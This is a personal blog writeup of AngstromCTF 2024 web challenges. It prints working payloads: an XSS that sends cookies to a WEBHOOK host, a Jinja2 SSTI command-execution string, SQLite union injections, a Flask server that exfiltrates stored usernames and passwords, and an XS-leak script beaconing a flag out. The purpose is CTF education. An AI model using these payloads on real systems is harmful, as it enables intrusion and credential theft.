---
date: '2025-02-05T15:18:06+07:00'
draft: false
title: 'AngstromCTF2024'
---
## TL;DR
This is a writeup for some web challenge for AngstromCTF 2024
## Spinner
```javascript=
const message = async () => {
    if (state.flagged) return
    const element = document.querySelector('.message')
    element.textContent = Math.floor(state.total / 360)
    if (state.total >= 10_000 * 360) {
        state.flagged = true
        const response = await fetch('/falg', { method: 'POST' })
        element.textContent = await response.text()
    }
}
message()
```
We can simply make POST request to /falg or using the console to assign the state.total to any number larger than stated above.
## Markdown
There are no filtering or any encoding use while parsing the HTML, so this is a simple XSS.
```javascript=
app.get('/view/:id', (_req, res) => {
    const marked = (
        'https://cdnjs.cloudflare.com/ajax/libs/marked/4.2.2/marked.min.js'
    )

    res.type('text/html').end(`
        <link rel="stylesheet" href="/style.css">
        <div class="content">
        </div>
        <script src="${marked}"></script>
        <script>
            const content = document.querySelector('.content')
            const id = document.location.pathname.split('/').pop()

            delete (async () => {
                const response = await fetch(\`/content/\${id}\`)
                const text = await response.text()
                content.innerHTML = marked.parse(text)
            })()
        </script>
    `)
})
```
A simple img tag can help us retrieve the cookie.
```htmlembedded=
<img src="" onerror="location='WEBHOOK/?c='+document.cookie">
```
And finally make a GET request to get the flag.

## Winds
This is an Jinja2 SSTI challenge, which they used render_template_string with untrusted data.
```python=
@app.post('/shout')
def shout():
    text = request.form.get('text', '')
    if not text:
        return redirect('/?error=No message provided...')

    random.seed(0)
    jumbled = list(text)
    random.shuffle(jumbled)
    jumbled = ''.join(jumbled)

    return render_template_string('''
        <link rel="stylesheet" href="/style.css">
        <div class="content">
            <h1>The windy hills</h1>
            <form action="/shout" method="POST">
                <input type="text" name="text" placeholder="Hello!">
                <input type="submit" value="Shout your message...">
            </form>
            <div style="color: red;">{{ error }}</div>
            <div>
                Your voice echoes back: %s
            </div>
        </div>
    ''' % jumbled, error=request.args.get('error', ''))
```
The tricky part was that the text was shuffle, but with the seed 0, we could preshuffle the payload so that it worked.
```python=
import random

def unshuffle(text):
    random.seed(0)
    a = list(range(len(text)))
    random.shuffle(a)
    new_text = 'X'*len(text)
    for i in range(len(text)):
        new_text = text[i] + new_text[a[i]+1:]
    jumbled = ''.join(text[a.index(i)] for i in range(len(text)))
    return jumbled

payload = "{{ cycler.__init__.__globals__.os.popen('cat flag.txt').read() }}"

def shuffler(payload):
    random.seed(0)
    jumbled = list(payload)
    random.shuffle(jumbled)
    jumbled = ''.join(jumbled)
    return jumbled

a  = unshuffle(payload)
print(a)
```

## Store
Firstly, I doubted this is an SQLi challenge. Making POST request with `item=a' or 1;-- -`.
I was able to identify the database which is SQLite thanks to this `item=a' or sqlite_version()=sqlite_version();-- -`.
will return everything. By trying union select, I knew the number of column of the table and the context of each column. `item=a' union select 'a','b','c';-- -`.
So following cheatsheet helped me find all the tables name `item=a' union select 'a','a',(SELECT group_concat(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%');-- -`.
We got a table whose name flags... Bingo !!!
Enumerated the columns `item=a' union select 'a','a',(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='flags...');-- -`
And finally retrieved the flag.

## Pastebin
### First finding
This challenge is quite interesting.
At first, I didn't know that secrets is a built-in library of python. I though it is something like secrets.py or so. And secrets.token_hex is a function.
Running str(secrets.token_hex) will get us `<function token_hex at 0x7fb85f4c2520>`. Ahhhh, address.
The /view endpoint with id=0 will get us the flag, if we got the MD5 password or the first 3 bytes of the MD5 password.
### id(something)
This function will get the address of the thing we put in.
### Solve
Why not bruteforcing the address. I thought that the address of the secrets.token_hex can be bruteforce. Combining with the hash 3 bytes, we could get the real password.
```python=
import hashlib
from tqdm import tqdm

base = 135598372746984
ADMIN_PASSWORD_head = '1797c2'
print("Brute up")
for i in tqdm(range(100_000_000)):
    h = hashlib.md5(f'password-<function token_hex at {hex(base+i)}>'.encode()).hexdigest()
    if h[:6] == ADMIN_PASSWORD_head:
        print(f'Found: {hex(base+i)}')
        print(f"h: {h}")
print("Brute down")
for i in tqdm(range(100_000_000)):
    h = hashlib.md5(f'password-<function token_hex at {hex(base-i)}>'.encode()).hexdigest()
    if h[:6] == ADMIN_PASSWORD_head:
        print(f'Found: {hex(base-i)}')
        print(f"h: {h}")
```
There were a few collision, but anyways, after 10 minutes and some try and error, you will get the flag.

## Tickler
This is annother client-side challenge with CSP. 
### CSP
The CSP was set to `script-src 'self'`. What is self?
`'self'` : Refers to the origin from which the protected document is being served, including the same URL scheme and port number.
### HTML Injection
In client.js, we saw this:
```javascript=
"/login": async () => {
    const form = document.querySelector("form");
    const error = document.querySelector("p");
    const query = new URLSearchParams(window.location.search);
    if (query.has("error")) {
        error.innerHTML = query.get("error") ?? "";
    }
    form.addEventListener("submit", async (event) => {
        event.preventDefault();
        const username = form.elements.namedItem("n");
        const password = form.elements.namedItem("p");
        const result = await client.doLogin.mutate({
          username: username.value,
          password: password.value
        });
        if (!result.success) {
          error.textContent = `Login failed. ${result.message}`;
        } else {
          localStorage.setItem("username", username.value);
          localStorage.setItem("password", password.value);
          window.location.href = "/";
        }
    });
},
```
So, by `/login?error=<h1>hehe</h1>`, we got our HTML Injection.

### Simple XSS (right?)
Will a simple 
```htmlembedded=
<script>alert(1)</script>
```
worked?
NO. It would be blocked by CSP. Maybe we need to upload something so that we could refer to it and not trigger CSP.
In server.ts, it has an endpoint which is /api/setPicture. and this is helpful. But it read data and base64 encode them, how can deal with this?
```typescript=
const buffer = new Blob(data)
const array = await buffer.arrayBuffer()
const base64 = Buffer.from(array).toString('base64')
pictures.set(ctx.user, {
    data: base64,
    type: response.headers.get('content-type') ?? 'image/png',
})
return { success: true as const }
```
```typescript=
else if (route === '/picture') {
    if (!url.includes('?')) return end()

    const query = new URLSearchParams(url.slice(url.indexOf('?')))
    const username = query.get('username')

    if (username === null) return end()

    const picture = pictures.get(username)
    if (picture === undefined) return end()

    const { data, type } = picture
    res.end(`data:${type};base64,${data}`)
}
```
We could modify the Content-Type.
But can javascript execute anything with `data:` in front of it? The answer is yes, actually, it can execute anything `anything:` before colon, because javascript treat those as labels. <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Statements/label">labeled statement</a>
So, simply host a Flask server
```python=
from flask import Flask, make_response

app = Flask(__name__, static_folder='static')

@app.route('/', methods=['GET', 'POST'])
def print_headers():
    response = make_response("hehe")
    response.headers['Content-Type'] = 'document.location=`WEBHOOK/?c=${localStorage.getItem("username")}_${localStorage.getItem("password")}`//'
    return response

if __name__ == "__main__":
    app.run(port=5000, host="0.0.0.0")

```
### Execute
We could simply add
```htmlembedded!
<script src="/picture?username=testtesttest"></script>
```
to the login page right? No, because our script tag was added after the client.js load. How to deal with this? Iframe. We can have an iframe that run our javascript.
That's how we got this URL.
```
https://tickler.web.actf.co/login?error=%3Ciframe%20srcdoc=%27%3Cscript%20src=%22/picture?username=testtesttest%22%3E%3C/script%3E%27%3E
```
The rest leaves to you then.
## Wonderful Wicked Wrathful Wiretapping Wholesale World Wide Watermark as a Service
This challenege was not pretty hard, because we could use img or script tag to check whether a site is 404 or 200. To be honest, this won't work for latest version of Chrome, because of Chrome's ORB. But luckily, the browser of admin bot was outdated. And another factor was that they configured the challenge's sites with SameSite policy, that's why the unintended trick worked.
The exploit script
```javascript!
let flag = "actf{";

let index = 0;
function search() {
    let charset = "0123456789abcdefghijklmnopqrstuvwxyz_}";
    let c = charset[index];
    let s = document.createElement("script");
    s.src = "https://wwwwwwwwaas.web.actf.co/search?q=" + encodeURIComponent(flag + c);
    s.onload = () => {
        flag += c;
        index = 0;
        new Image().src=("WEBHOOK/?flag=" + encodeURIComponent(flag));
        search();
    }
    s.onerror  = () => {
        index++;
        search();
    }
    document.head.appendChild(s);
}
search();
```
And in the Markdown challenge, we simply used
```htmlembedded!
<iframe srcdoc="<script src='HOST/exploit.js'></script>"/>
```
That's it.